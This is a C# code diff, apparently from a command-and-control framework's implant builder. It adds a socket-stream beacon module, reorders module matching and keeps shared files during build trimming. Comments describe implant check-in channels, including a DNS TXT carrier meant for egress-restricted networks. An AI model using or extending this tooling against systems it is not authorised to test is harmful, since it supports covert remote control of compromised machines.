@@ -52,7 +52,7 @@ public enum CheckInModules
     /// The DNS check-in client (the implant's DnsCheckIn): serves walk
     /// entries whose beacon URL is dns-schemed -- the egress-restricted
     /// TXT carrier, poll-only (the parser refuses a stream-mode naming
-    /// with the fix, the same rule the socket family applies).
+    /// with the fix).
     /// </summary>
     Dns = 16,
 
@@ -63,6 +63,14 @@ public enum CheckInModules
     /// verbs on the shared store-and-forward carriage.
     /// </summary>
     Socket = 32,
+
+    /// <summary>
+    /// The socket stream client (the implant's SocketStreamBeacon): serves
+    /// walk entries whose beacon URL is tcp- or smb-schemed on a stream-mode
+    /// bake -- the same held live session the web WebSocket beacon and the
+    /// QUIC session run, over the wire both socket clients share.
+    /// </summary>
+    SocketStream = 64,
 }
 
 /// <summary>
@@ -85,7 +93,8 @@ public sealed record CheckInModuleDescriptor(
 /// The registered check-in modules. Matching order is load-bearing: the
 /// shapes are disjoint except the stream descriptor's bare host:port
 /// fallthrough, which must sit last so a schemed or quic or dns entry never
-/// falls into it.
+/// falls into it, and the socket family's two clients, whose order decides
+/// which one a both-compiled build dispatches a socket URL to.
 /// </summary>
 public static class CheckInModuleRegistry
 {
@@ -111,10 +120,21 @@ public static class CheckInModuleRegistry
             ["Internal/DnsCheckIn.cs", "Internal/DnsEnroll.cs"],
             (url, _) => IsDnsBeaconUrl(url),
             "        DnsCheckIn.Create(setup),"),
+        // The socket family's stream client sits ahead of its poll client in
+        // the registry: a build both compile into (a socket-schemed enroll
+        // claims the poll module for its dial whatever the mode) dispatches
+        // by list order, so the stream client serves the socket URL of a
+        // stream-mode bake and the poll client rides as the enroll dial's
+        // dead weight, trimmed by the linker.
+        new(
+            CheckInModules.SocketStream,
+            ["Internal/SocketStream.cs", "Internal/SocketWire.cs"],
+            (url, mode) => IsSocketBeaconUrl(url) && mode == CheckInModes.Stream,
+            "        SocketStreamCheckIn.Create(setup),"),
         new(
             CheckInModules.Socket,
-            ["Internal/SocketCheckIn.cs", "Internal/SocketEnroll.cs"],
-            (url, _) => IsSocketBeaconUrl(url),
+            ["Internal/SocketCheckIn.cs", "Internal/SocketEnroll.cs", "Internal/SocketWire.cs"],
+            (url, mode) => IsSocketBeaconUrl(url) && mode != CheckInModes.Stream,
             "        SocketCheckIn.Create(setup),"),
         new(
             CheckInModules.Stream,
@@ -278,12 +298,25 @@ public static class TransportModuleSelection
             throw new InvalidOperationException(
                 "A build must compile at least one check-in module; the egress walk's primary entry always has a shape.");
 
+        // The files the selected modules keep: a file shared by two modules
+        // (the socket family's wire, compiled into both its clients) stays
+        // when either module compiled, so an unselected sibling's delete
+        // pass cannot drop it out from under the survivor.
+        var keep = new HashSet<string>(
+            CheckInModuleRegistry.All
+                .Where(descriptor => (modules & descriptor.Module) != 0)
+                .SelectMany(descriptor => descriptor.Files),
+            StringComparer.Ordinal);
+
         foreach (var descriptor in CheckInModuleRegistry.All)
         {
             if ((modules & descriptor.Module) != 0)
                 continue;
             foreach (var file in descriptor.Files)
-                File.Delete(Path.Combine(stagingDir, file));
+            {
+                if (!keep.Contains(file))
+                    File.Delete(Path.Combine(stagingDir, file));
+            }
         }
 
         File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
